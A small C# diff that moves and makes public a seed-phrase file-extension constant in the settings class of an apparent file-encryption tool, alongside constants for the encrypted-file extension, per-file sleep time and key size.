@@ -43,6 +43,11 @@
         public static string _EncryptedFileExtension = ".eye";
 
         /// <summary>
+        /// Seed Phrase File Format
+        /// </summary>
+        public static string seedPhraseFileFormat = ".eyesph";
+
+        /// <summary>
         /// Sleep time between operating each file.
         /// </summary>
         public static int _CryptographySleepTime = 10;
@@ -52,9 +57,5 @@
         /// </summary>
         public static byte _DigitalKeySize = 32;
 
-        /// <summary>
-        /// Seed Phrase File Format
-        /// </summary>
-        static string seedPhraseFileFormat = ".eyesph";
     }
 }
